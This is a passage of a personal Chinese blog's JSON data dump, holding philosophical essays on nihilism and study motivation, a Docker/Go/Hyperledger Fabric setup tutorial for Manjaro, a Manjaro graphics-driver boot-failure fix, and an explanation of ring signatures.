活着就是推这块石头。我将推石头泛化一下，活着就是做某件事，不是做过某是，活着将要做某事，而是做某是，它不受时间的限制，甚至是不受任何一切的限制，既可以将人生归结于而一个无限大的“做某事”，既“活着”，也可以细分为很小的做某事，如写这篇文章。但是与萨特描述的自由相似，你唯一的不自由就是无法选择不自由，你唯一无法做的事就是什么都不做。 我不否认我对活着的理解中包含着一种无法剔除的虚无主义，这种虚无就是–如果我是西西弗斯，那我就不去推那个石头，任由它就在山底下，推他有什么意义？我是傻吗，我去推它。于是可以产生一个很经典的问题–我可以多大程度的忍受我接近这个虚无主义。 对于这与生俱来的虚无主义我想说的是，不要试图通过任何方式去否认这种虚无的存在，也不要利用这种虚无去做任何事，比如说，为了逃离这种虚无我应该奋发图强，努力奋斗，我不是否认奋斗，而是想否认这种将奋斗丢入虚无的做法。当然也存在那种更深层次的因果指向关系例如害怕落在后面。 虚无可以吞噬一切，当你试图通过什么东西填满它然后站在其上，那么你终究会陷入虚无之中。 用流行词来说就是，活着就是做什么，那么我为什么不开摆呢？我又为什么要开摆呢？我为什么不去卷？又或者我为什么要卷？（我认为摆和卷都可以来自于为了什么什么这样的话语，只是一个自认为可以实现，一个自认为不能实现）不管怎样我都是活着。但是活着并不能回答我是卷还是摆。 活着不是否认虚无，而去努力的做什么，或者是在虚无面前低头，追求什么都不做。如果有一天某个理由可以让你莫名的努力那么当你暮然回首去寻找ta的来由时，不知你能否接受那人不再灯火阑珊处，又或者你害怕这个人真的不存在，而不去回头。我的答案是，我肯定会在某个时间上回头，除非在这个时间到来之前我已经无了。 如何应对这种虚无，我是如何得到我肯定会回头的这个答案我认为这种虚无主义的源头是–活着就是做什么，活着包含一切做什么，可以救人，也可以做相反的事。无论做什么都是活着，活着似乎不代表任何的积极意义或者是消极意义。什么是做点什么？我应该做什么？这样子想最后很容易归结到我是谁？我从哪儿来？要去哪儿？ 与其想一些没有答案的问题，不如看看现在有些什么，有没有什么能解决这种困局。 所以我认为应对这种虚无的关键有两步– 1）认真面对活着就是做些什么这个事实，而不是追求什么都不做，不以什么都不做为目标而去做些什么。认真的面对从此刻到死亡不不会有停歇的时候，我永远都在做些什么，就如西西弗斯一样永无止境的推着石头。如果真的去追求生命的意义，最好是做好竹篮打水一场空的准备。 2）做一个忠实的信徒，不管是信什么，做一个忠实的信徒。我始终认为如果一个谎言欺骗我的死，那么它一定就是真相。无论是相信什么，它都会告诉你–“活下去”。 一部小心又扯到死亡这个话题上，不过我个人感觉谈死亡是一个很搞笑的话题，我对死亡的理解是–只要我还活这我就不会死。只要我还有有一丝力气去面对活着就是做什么，那么死亡就是个笑话，不过可能是我现在太年轻，没有那种慢慢等死的感觉。 所以在回过头来信仰是”卐“吗？ 是又不是，我无法证明信仰是不是一种谎言。 如尼采所说“上帝死了！” 他这句话否认的不是上帝，而是整个彼岸世界，人的生命是有尽头的的，死后没有天堂，没有来世。对于此世的信仰不能建立在任何的此岸之外的地方。当然我对宗教理解的不多，只能泛泛的说，信仰会告诉人做什么。 所以我认为对抗虚无的方法是，通过活着的本质确立虚无主义的存在，确认人必定在做什么之一事实，而放弃去思考那种如同神一般无敌的“为什么？”从而接受推石头这一事实，而不是自暴自弃。信仰的目的是通过一种看似虚无的方式去回答到底要做什么，或者说他是一面墙，阻挡那个可以摧枯拉朽般将所有的的做什么都归结于毫无意义的神。我对信仰的本质理解是，信仰就是人的自由意识的结晶。或者说是灵魂一样的东西。 所以我为什么肯定会回头？ 因为我不会去问为什么我要回头，所以如果我的生命是无限的，那么我必然会在某个时间回头。 信仰似乎信仰这个东西对回答上一个问题太过重要，而又说得太少。 我脑海里试图将宗教与信仰分开来谈（主要是我也不了解宗教），但当试图将信仰从宗教中分离开来时，我似乎看到了信仰是离不开宗教的，因为我无法否认自己的信仰在某种程度上可以称作是一种宗教，我是唯一的教徒。所以就不谈宗教与信仰之分，直接来说一下我所了解过的信仰。 1）神 不相信神对我来说是一种不可磨灭的思想钢印，但是我站在无神论者的角度，大概窥探了一下神的世界，肯定会有偏差，不过我打算就到这儿了。 2）以科学为代表的理性世界 这是最好理解的信仰，人从小就被灌输这种信仰，当然这种行为也不能说是好是坏，我也是从这里面走过来的的，甚至我也不能否认ta。我肯定不会知道如果没有这种灌输我是什么样的。当然科学它本身也有很大的潜力去作为某种信仰，因为科学代表的就是真理，有点像是科学规定了什么什么是真理，然后我在寻找一种超越科学的真理。不过科学犯了一个巨大的错误，科学所回答的做什么对于每个人都是相同的，在科学的眼中，世界可能不是每个人都一样，但是对人的分类一定是有限的，无非就是通过多重分类+排列组合显示出每个人的独特，科学眼中的人如同NFT中作品的特征一样，分为多重特征，每种特征有不同的比例，然后排列组合。 我并不是全然的不喜欢科学，我对科学的唯一歌颂就是科学在做什么这个巨大的虚无中为每个人撑起了一片天。所以我继续批判科学的局限性，以便找到科学所缺失的。 这种世界以科学为基石来解释理性，属实是自己把自己提起来了。这里就不讨论科学是怎么做到的。 当然科学不能作为信仰的原因是，ta不接受”活着“所产生的虚无主义，他回答做什么这个问题太过于直接，以至于让我怀疑科学本身。当信仰被怀疑的时候，信仰还是信仰吗？ 3）理想主义 可以很坦白的说，我就是一个理想主义，我也认识到我的理想主义思维，但由于我曾经写过一句话类似于封印一样的话，让我无法否认理性主义–“理想的理想主义就是接受不理想”，所以又可以问一个没有答案的问题–我应该在多大的程度上接受不理想？ 为什么说理想主义是一种信仰呢？理想主义的一个重大问题是无法考虑到所有的方向，有与过度在在某些方向使得某件事理想，就会忽视这件事的其他方向，当然理想主义也是值得肯定的，理性主义可以最大程度大发挥人感性的力量，极致的理想主义是感性的最大体现。但理想主义最大的缺陷是没有理性的支撑，导致其本身都难免化为虚无。 至于我最终是如何放弃理想主义。（当然只是说没有之前那么的理想主义，那句话的封印我似乎是解决不了的）—想象自己就是理想主义，然后模仿理想主义的思维，最终发现自己不全然是一个理想主义者，进而道生一，一生二，二生三，三生万物，如此将理想主义逐渐从思维中剥离，为防止我疯得太早，暂且不想这是理想主义给我设的陷阱。 所以信仰是个什么东西？ 我不知道如何将我理解的信仰与“做点什么”这个事联系起来，也就是，我也不知道我的信仰到底回答了我做什么。有一个很生动的比喻，我坐在椅子上，发现椅子有点不稳（对于做什么没有答案），然后我找了个东西垫了一下我的椅子脚，然后它刚好稳住了，就像是这个东西本来就在这儿。我感觉信仰就是这个垫脚的。 我的信仰来自于两个东西。 1）《禅与摩托车的维修艺术》 –&gt;良质 2）道教 这两者之间存在很多的相似之处，而且我目前也正在看《道德经》这本书，所以现在我就先不急着说这里面的内容。 花絮从西西弗斯神话开始有一个东西没有引出来–加谬所说的“唯一严肃的哲学问题就是自杀”，感觉是因为不太会写所以导致没法引出来，后面也有一些小的故事没有讲。 证明生命没有意义不是我的重点，我重点想说的是寻在生命的意义是没结果的，我所重点否是的是寻在生活着的意义的这种做法，我想要重点表达的是–活着就是做点什么，这是生命的最根本，不存在问为什么要做点什么。 在行文上，文章提到了两次 – 暮然回首那人不再灯火阑珊处，但实际上两个语义不同，这确实是个问题，但我既然写在这，那我可定是不打算改的。 个人感觉直接把信仰插到生命里面有点不妥，但说实话我也不知道信仰这个词为什么刚好可以填充到那儿，就跟我后面打的那个椅子的比喻一样。 从生命-&gt;信仰-&gt;道教 个人感觉跳得有点快，不过还是那个来问题，我也描述不出来是怎么跳过去的，或者这个跳的有点快是我个人yy出来的。但是《禅与摩托车的维修艺术》， 道教 肯定是核心，但是我同样描述不出来，可能得把书多看几遍能描述出来，暂且先吊着胃口。 在文中多次用到一个反问–我应该以多大的程度上怎么怎么样，这句话出自于《禅与摩托车的维修艺术》中作者的提问，一个人应该在多大程度程度上独立维修自己的摩托车。 关于理想主义为什么要用封印这个词，第一点是这个词用在那儿很利于理解，第二点是这个词除了有点中二，放在那儿简直就是完美，所以忍一忍，就放那儿了。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"},{"name":"人生","slug":"随笔/人生","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/%E4%BA%BA%E7%94%9F/"}],"tags":[{"name":"沉思录","slug":"沉思录","permalink":"https://bighu630.github.io/tags/%E6%B2%89%E6%80%9D%E5%BD%95/"}],"author":"ivhu"},{"title":"从0开始搭建fabric区块链（第一期，环境准备）","slug":"从0开始搭建fabric区块链（第一期，环境准备）","date":"2022-07-09T12:06:29.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2022/07/09/从0开始搭建fabric区块链（第一期，环境准备）/","permalink":"https://bighu630.github.io/2022/07/09/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BAfabric%E5%8C%BA%E5%9D%97%E9%93%BE%EF%BC%88%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%8C%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%EF%BC%89/","excerpt":"","text":"这篇博客详细介绍了在Manjaro Linux虚拟机上安装和配置Docker环境的步骤，包括安装Vim、Docker、Docker Compose和VSCode，以及设置Go环境和Hyperledger Fabric。作者提供了具体的命令和配置，帮助用户无须sudo即可使用Docker，并测试了Fabric网络的连通性，展示了顺利启动测试网络后应有的结果，尽管有部分图片在迁移中丢失。 环境说明我使用的是manjaro linux作为底层的系统环境，使用vbox安装的manjaro虚拟机，其他linux也可以 manjaro换原操作可参考这篇https://www.jianshu.com/p/2d096cd9ad61博客 在manjaro换源更新好之后 安装docker环境#安装vim用于编辑 sudo pacman -S vim #安装docker sudo pacman -S docker #安装docker-compose,用于启动docker集群，配置docker sudo pacman -S docker-compose #安装yay,用于安装aur软件 sudo pacman -S yay #安装vscode，我喜欢用vscode来管理docker和查看docker的log yay -S visual-studio-code-bin 对于其他的linux,只需要安装vim,docker,docker-compose,vscode 安装好之后需要修改一下用户组，这样在使用docker的时候可以不用sudo（默认情况下docker是需要sudo权限的） #添加docker这个用户组，好像不需要这一步（我试过），但网上都是这么搞 sudo groupadd docker #添加到deocker用户组 sudo usermod -aG docker ${USER} #重启docker服务 sudo systemctl restart docker 获取fabric环境 安装go#go环境下载地址：https://go.dev/doc/install #下载完成之后将go的包解压在任意位置，然后设置go的gopath,goroot #例如我的go解压在/home/ivhu/.go,我设置了一下环境变量 export GOROOT=/home/ivhu/.go #这个位置存放go的可执行文件 export GOPATH=/data/code/Go #这个可以是任意文件夹，主要是存放后续下载的go的第三方包 #将一下语句写入.bashrc/.zshrc/系统环境变量配置文件，一般是.bashrc,由于我更换过终端，所以我是写在.zshrc里面 export GOROOT=/home/ivhu/.go export GOPATH=/data/code/Go export GOBIN=$GOPATH/bin export PATH=$PATH:$GOROOT/bin export PATH=$PATH:$GOPATH/bin #写入后重新加载配置文件 source ~/.zshrc #或者重启也可以 安装fabric#获取fabric的安装脚本： wget https://raw.githubusercontent.com/hyperledger/fabric/main/scripts/bootstrap.sh #为脚本授权 chmod u+x bootstrap.sh #运行脚本 ./bootstrap.sh #这里会下载大量的docker镜像，等待时间会比较久 运行完成后可以看到如下 在fabric-samples中可以看到如下 在这之后需要将这个bin文件夹添加到环境变量，后续会使用里面的工具测试网络是否能通 #进入test-network文件夹，里面存放这测试网络的配置文件 cd test-network #这个文件夹在fabric-samples里面 #开启测试网络 ./network.sh up #可能会下载一些docker镜像，需要较长的时间 #成功启动表示环境配置的没问题，后续将详细解释这些配置文件的作用 运行成功后： 图片在迁移过程中丢失 😢","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"联盟链","slug":"区块链/联盟链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E8%81%94%E7%9B%9F%E9%93%BE/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"fabric","slug":"fabric","permalink":"https://bighu630.github.io/tags/fabric/"}],"author":"ivhu"},{"title":"manjaro安装错误的显卡驱动导致无法开机（解决办法）","slug":"manjaro安装错误的显卡驱动导致无法开机（解决办法）","date":"2022-06-25T06:42:17.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2022/06/25/manjaro安装错误的显卡驱动导致无法开机（解决办法）/","permalink":"https://bighu630.github.io/2022/06/25/manjaro%E5%AE%89%E8%A3%85%E9%94%99%E8%AF%AF%E7%9A%84%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E5%AF%BC%E8%87%B4%E6%97%A0%E6%B3%95%E5%BC%80%E6%9C%BA%EF%BC%88%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%EF%BC%89/","excerpt":"","text":"这篇博客记录了作者在尝试修改Manjaro显卡驱动时，因不当操作导致系统卡死的经历。作者首先尝试了多种网上常见的解决方案，比如通过TTY终端重装驱动和在GRUB中无显卡模式启动，但都未成功。最后，作者意识到问题出在内核与驱动的兼容性上，并通过使用Manjaro启动盘、进入LiveCD后利用manjaro-chroot命令获取终端，成功挂载系统并解决了问题。整个过程展现了修复Manjaro内核及显卡驱动的具体操作步骤。 手欠的我最近发觉我的manjaro有时候开机会卡死在clean ….这个地方，然后我去看了下系统的日至，发现是nvidia的一个报错，我也不太懂什么意思 然后我就自己动手想改改显卡驱动（从prime到大黄蜂），想看一下能不能解决问题（虽然只是偶尔触发），然后悲剧就发生了，从偶尔（10%）卡死到一定会卡死。 没有解决我问题的答案error1：网上的大多数教程 在卡死的地方按Ctrl-Alt-F2&#x2F;F3 开启一个tty,然后在tty里面重装显卡驱动 失败原因：卡死之后什么都按不了，我也知道个我个终端可以重装显卡驱动，但是显然我没法拿到终端 error2：在grub启动的时候选择无显卡打开 具体操作是在grub引导时该一下grub的启动参数，网上也有很多教程 我这么想是因为，曾经试过linux忘记密码，可以在这里改个东西直接拿到一个root的shell， 不过这次尝试依旧失败了 原因是显卡驱动会直接写到内核里面去（反正是安装驱动的时候会重新编译一次内核）所以在这种强制开启的情况下依旧是打不开的。 我最后的思路由于意识到是linux内核的问题，所以解决方案也好找 不过这里可以插一嘴，目前大多数linux都是多内核的，而且每个内核还有一个（有点像windows的安全模式）的版本，我的就有三个内核（18&#x2F;15&#x2F;10） 但是我使用manjaro的驱动安装程序（mhwd）换显卡驱动导致他把每一个内核的驱动都换了，然后我每个内核都是挂B状态 插完嘴之后就是找找manjaro内核修复的方法，我不知道别的系统能不能，但是我查的时候发现arch系的好像是都可以（不知道debian系的怎么样） 具体操作操作方法如下 1.烤一个manjaro的启动盘（版本越新越好，桌面环境我不知道需不需要一样，感觉不需要） 2.进入livecd 3.打开一个终端使用manjaro-chroot -a，这个命令可以直接挂载硬盘上的linux盘，然后获取一个shell终端，有root的 4.拿到终端之后就是正常操作 具体操作可以看看下面这篇友人写的博客https://www.i4k.xyz/article/Fmj_Zjq/106762144","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"linux","slug":"计算机/linux","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"}],"tags":[{"name":"manjaro","slug":"manjaro","permalink":"https://bighu630.github.io/tags/manjaro/"},{"name":"显卡驱动","slug":"显卡驱动","permalink":"https://bighu630.github.io/tags/%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8/"}],"author":"ivhu"},{"title":"从考研到人生","slug":"从考研到人生","date":"2022-06-14T12:04:59.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2022/06/14/从考研到人生/","permalink":"https://bighu630.github.io/2022/06/14/%E4%BB%8E%E8%80%83%E7%A0%94%E5%88%B0%E4%BA%BA%E7%94%9F/","excerpt":"","text":"这篇博客探讨了考研的动机与结果之间的关系，作者反思了许多人考研是为了结果的现象，并提出了对未来幸福的质疑，通过假设一个机器可以预测考研结果，探讨了人们在得知结果后的反应和内在动力的寻找，强调了体验过程的重要性，认为即使没有结果，努力与成长仍然能带来满足感，最终阐述了自由与存在的哲学思考。 首先，我非常遗憾的认为很多人考研是为了考研这个结果，也就是考不考得上。 我总是希望能有别的原因，但是的我的结果却是–更多的人是很在意这个结果的，有的时候甚至是怀疑是我的悲观主义导致的这种想法。 但是假设这就是事实。那么，这里存在一个巨大的陷阱，也就是我所总结的人生三大谎言之一的–未来的谎言，我是为了未来的幸福（或者其他的什么东西，反正这里有一个词）。当然也不一定会掉入这个陷阱–因为这个目标并不一定是当前考研这个状态的唯一动力，或者说是唯一原因，更或者说它可以是一个不是很重要的原因。 我做了这样一个假设–假如有一个机器可以告诉你你考研会不会上岸，如果你知道了你可以上岸，你还会去准备考研吗，或者如果你知道了你可以考上，你还能一如既往的努力吗。我的映像里，我认为可能会有15%的人会继续去准备考研，或者是一如既往的努力。有20%的人会纠结与放弃和坚持之间，或者说不再那么的努力坚持，剩下的，我认为会在坚持一个月以内选择放弃。我觉得我会在那非15%的人里面，但是我希望我能成为那15%的人。 我这个假设做了什么–我抹去了结果对现在的影响，我认为结果确实可以是当前状态的一个动力，但是在当前状态一定有一个当前的动力来直接影响当前的行动，而我想要做的是找到这个内在动力，能让我抵抗考研（或者别的什么事，我是不考研的）的痛苦。 我认为，假如我真的想要体验考研这个过程（实际上，这个过程是痛苦而由令人充实的，这种充实也与结果无关，只是感受到自己的强大，和自己的进步，我认为我真的不需要那么多的东西，我不是很想打游戏，有时候感觉游戏只是一个多巴氨的工厂，被多巴氨所控制的快乐或许不是我想要的快乐，当然，我好像是知道答案，我想要自由，而不是被控制，所以这种一多巴氨控制的快乐并不是我想要的，我更愿意看到的是我自己，我需要的不是甜，而是甘。），我假设的一种想法是，我能在这个过程里面燃烧我自己，在时间的舞台上展现我自己，去成为ME plus。回到考研这个假设中，我存在这这样一种选择–或许我知道考研的答案（我考上了，或者考不上），但是从现在到考研的这一段时间里面我是可以去燃烧我自己的精力，在时间的舞台上尽情的舞蹈，（这来源于我之前听过的一首歌–在夜里跳舞），我想说的是即使是没有这个结果的存在，我还是可以先选择去经历考研这个过程，去感受自己。或者说，如果没有这个结果，我看到的我就是一个更真实的我。 当然，这只是一个选择，我大可以选择放弃。就如海德格尔所说，沉沦与否在于你的选择。还有我很喜欢的一首歌–海浪里面的：“必须在沉沦于失望见选择”。我很希望我能选择不要沉沦（选择失望&#x2F;希望），但是我也知道，坚持的背后是什么，是一种我看一眼就足够然我瑟瑟发抖的东西，可我要想办法与其同舞，因为我就在这里，这种东西，或许和促使戒毒的人再吸毒的那股力量一样，我觉得我要是吸毒的话一定很难戒（所以就不要想着去尝试了），是一种空虚吗，我不知道，它太恐怖了。但我肯定会去面对他，去感受他，与他形成同感。会不会那就是自由的重量。 在这个假设之上的推导： 人，终有一死 死亡是人生的必然答案。我是走在死亡的路上，或者是我是处在死亡的进行时，我向往的是自由，所以我不应该被世界所限制，我不想为了世界而活下去，这像是我要依托于世界的存在我才存在，但是我的思维是，世界是依靠我的存在而存在，或者是我们是相互依存的，我为自己而活，那么我就是与世界依存的，我为世界而活，那我就是依托于世界而存在的，但深知我的存在的，像是海德格尔所说的自在之在（我的存在就是世界的根源之一）。反正不管怎么说，我知道我是不属于这个世界的，我于世界是两个对等体。 我虽有一死，但我还活着，我活着的意义在于认识世界，认识我，在这不知道长度的时间线上舞动自己，become me plus。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"沉思录","slug":"沉思录","permalink":"https://bighu630.github.io/tags/%E6%B2%89%E6%80%9D%E5%BD%95/"},{"name":"考研","slug":"考研","permalink":"https://bighu630.github.io/tags/%E8%80%83%E7%A0%94/"}],"author":"ivhu"},{"title":"环签名","slug":"环签名","date":"2022-03-01T09:28:48.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2022/03/01/环签名/","permalink":"https://bighu630.github.io/2022/03/01/%E7%8E%AF%E7%AD%BE%E5%90%8D/","excerpt":"","text":"这篇博客详细介绍了环形签名的概念、目标和特性，阐明了如何通过一组公钥和随机数实现匿名性和不可伪造性，解释了环签名在现实案例中的应用，提供了环签名的一种实现方法. 在密码学中，环形签名是一种数字签名，可以由一组用户中的任何成员执行，每个用户都有密钥。因此，一个带有环签名的消息是由特定人群中的某个人背书的。环签名的安全特性之一是，不能通过计算确定哪个组成员的密钥才是签名。 例如，环签名可以用来提供一种来自“白宫高级官员”的匿名签名，而不透露是哪位官员签署了这条信息。环签名适合这个应用，因为环签名的匿名性不能被撤销，而且一个环签名的是可以临时组成的（不需要预先设置）。 以上信息来自百科 环签名的任务环签名所要达成的目标是：在签名过程中将与私钥相关的信息隐藏在众多公钥之中。 环签名的可用性在签名过程中，每个公钥都对应这一个随机数（随机数会参与计算），而签名者由于拥有自己的私钥，所以可以计算出一个能够使的环闭合的那个特定的数（之后会放在随机数里），我们无法在一堆随机数里找到这个特定的数，也就是说无法确定是谁的私钥参与了计算。但是可以确定这个签名一定是至少拥有这众多公钥之中某一个对应的私钥，不然是无法使环闭合。这就可以保证一定是环中的某个成员所签名认证的。 利用众多的公钥依次对消息进行加密（其中掺杂这随机数，随机数与公钥存在一一对应关系） 环签名的特性除了上面所说的匿名性以外，环签名的另一特点是签名者在完成签名之后无法证明改环签名是由自己所签。 因为在随机数列表中他无法证明那个特定的随机数是签名者自己产生的，实际上每个拥有对应私钥的人都可以说某个随机数是他产生的。也都可以说是其他人产生的，因为从一个环的任意一点截断所得到的绳子一定是一样的。 通过现实案例解释环签名例如你们需要实名举报你们某个人，但是谁都不想在这个签名纸上第一个签下自己的姓名（这相当与发起人），这时你提议所有人以某个点为圆形，在一定的半径上签名，在所有人都签完之后形成一个完整的环，这样也就无法确认这个环的首部在哪里。 当然这个案例所讲述的知识环签名的作用，在实际操作上与上述实例还是有很大的不同。 环签名的一种实现（利用各个公钥的加密算法） 签名者需要拥有：多个他人的公钥{P0,P1,P2…….Pn}注意这里的他人有n+1个，以及对应的加密算法Gi，自身的公私钥对 签名者首先计算待签名的哈希值用作签名，记做H 签名者为每个公钥产生一个对应的R，及产生{R0,R1,R2…….Rn} 签名者产生一个随机数V0，用做首次计算 签名者利用他人的公钥将Ri加密产生对应的Y，记做{Y0,Y1,Y2,Y3…..Yn} 依次计算V1&#x3D;V0^Y0+H……..最后的到V(n+1):这一步已经利用晚所有的公钥（这里本来是连续亦或，后来发现连续亦或有可能导致H被抵消掉） 现在已经形成一个链，如果V0和最后一个V相等则会形成一个环（现在是不等的） 于是我们可以计算出那个使环闭合的Y,V0&#x3D;V(n+1)^Y^H，这里V0,V(n+1),H都已知可以得到这个Y 也就是说只要我有一个特定的R，使得用我的公钥加密后的结果为Y,那么这个R就会使环闭合 所以这里就到了签名最关键的一步，在已知Y的情况下，签名者用自己的私钥很容易就可以计算出这个特定的R，因为这个Y是用签名者自己的公钥计算出的。 将签名者的私钥放在listP的尾部，R放在listR的尾部 这里由于会暴露签名者在这个公钥链表的尾部，所以还不急着把V放进去，在已知这是一个环的情况下我们只需要将这个环随机的转动一下，也就是对listP,listR进行一个循环移位，然后将对应的V选取出来得到这个签名S(listP,listR,V) 上述签名的可用性原理要说明这个签名的可用性主要是要证明这个签名一定是由公钥中的某个人所签的，他人可以验证的到这个签名是正确的 首先在上述签名过程中使环闭合的那个数是由签名者私钥计算得出的，也就是说签名者至少拥有listP中某一个或多个公钥所对应的私钥，这也就说明了签名一定来自与listP中的某个人，在listP之外的人是无法伪造签名的。验证人只需要计算文件的hash然后利用计算出的H验证这个V成环。 先预约一下下次更新:go或者python实现环签名（实际上我已经用go大概实现了原理，但是go语言自带的rsa库中不能用私钥解密一个随机的数据，他还会验证数据是否可用，就是败在最关键的一步）😭，最迟下周6更新","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"密码学","slug":"区块链/密码学","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://bighu630.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"环签名","slug":"环签名","permalink":"https://bighu630.github.io/tags/%E7%8E%AF%E7%AD%BE%E5%90%8D/"}],"author":"ivhu"}],"categories":[{"name":"技术实战","slug":"技术实战","permalink":"https://bighu630.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/"},{"name":"数据库","slug":"技术实战/数据库","permalink":"https://bighu630.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"预言机","slug":"区块链/预言机","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%A2%84%E8%A8%80%E6%9C%BA/"},{"name":"总结","slug":"总结","permalink":"https://bighu630.github.io/categories/%E6%80%BB%E7%BB%93/"},{"name":"面试","slug":"区块链/面试","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%9D%A2%E8%AF%95/"},{"name":"solana","slug":"区块链/solana","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/solana/"},{"name":"图书","slug":"图书","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/"},{"name":"禅与摩托维修艺术","slug":"图书/禅与摩托维修艺术","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/%E7%A6%85%E4%B8%8E%E6%91%A9%E6%89%98%E7%BB%B4%E4%BF%AE%E8%89%BA%E6%9C%AF/"},{"name":"恐惧与颤栗","slug":"图书/恐惧与颤栗","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/%E6%81%90%E6%83%A7%E4%B8%8E%E9%A2%A4%E6%A0%97/"},{"name":"知识","slug":"知识","permalink":"https://bighu630.github.io/categories/%E7%9F%A5%E8%AF%86/"},{"name":"传播学","slug":"知识/传播学","permalink":"https://bighu630.github.io/categories/%E7%9F%A5%E8%AF%86/%E4%BC%A0%E6%92%AD%E5%AD%A6/"},{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"笔记","slug":"计算机/笔记","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E7%AC%94%E8%AE%B0/"},{"name":"二层","slug":"区块链/二层","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BA%8C%E5%B1%82/"},{"name":"哲学","slug":"哲学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/"},{"name":"克尔凯郭尔","slug":"哲学/克尔凯郭尔","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%85%8B%E5%B0%94%E5%87%AF%E9%83%AD%E5%B0%94/"},{"name":"智能合约","slug":"区块链/智能合约","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"容器","slug":"计算机/容器","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E5%AE%B9%E5%99%A8/"},{"name":"运维","slug":"计算机/运维","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%BF%90%E7%BB%B4/"},{"name":"linux","slug":"计算机/linux","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"},{"name":"随笔","slug":"随笔","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"},{"name":"人生","slug":"随笔/人生","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/%E4%BA%BA%E7%94%9F/"},{"name":"当代占星研究","slug":"图书/当代占星研究","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/%E5%BD%93%E4%BB%A3%E5%8D%A0%E6%98%9F%E7%A0%94%E7%A9%B6/"},{"name":"教程","slug":"教程","permalink":"https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/"},{"name":"科学上网","slug":"教程/科学上网","permalink":"https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"以太坊","slug":"区块链/以太坊","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"形而上学","slug":"哲学/形而上学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/"},{"name":"心理学","slug":"哲学/心理学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%BF%83%E7%90%86%E5%AD%A6/"},{"name":"经济","slug":"经济","permalink":"https://bighu630.github.io/categories/%E7%BB%8F%E6%B5%8E/"},{"name":"go","slug":"计算机/go","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/go/"},{"name":"唯心主义","slug":"哲学/唯心主义","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%94%AF%E5%BF%83%E4%B8%BB%E4%B9%89/"},{"name":"网络","slug":"计算机/网络","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%